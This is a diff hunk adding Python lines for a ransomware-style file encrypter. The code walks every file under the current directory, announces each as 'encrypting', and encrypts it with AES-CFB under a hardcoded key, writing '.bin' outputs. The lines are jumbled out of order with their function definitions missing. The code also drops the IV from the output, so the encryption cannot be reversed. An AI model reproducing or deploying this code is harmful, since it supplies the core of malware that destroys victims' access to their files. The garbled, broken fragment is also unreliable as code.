@@ -1,0 +1,16 @@
+   for root, _, files in os.walk("."):
+       for file in files:
+           file_path = os.path.join(root, file)
+           print(file_path + " is encrypting.")
+           encrypt_file(file_path)
+   with open(path) as f:
+       plain_text = f.read()
+   key = b'this is a 16 key'
+   iv = Random.new().read(AES.block_size)
+   mycipher = AES.new(key, AES.MODE_CFB, iv)
+   ciphertext = iv + mycipher.encrypt(plain_text.encode())
+   with open(path + ".bin", "wb") as file_out:
+       file_out.write(ciphertext[16:])
+   encrypt_dir(path)
+   encrypt_file(path)
+   print("it's a special file(socket,FIFO,device file)")
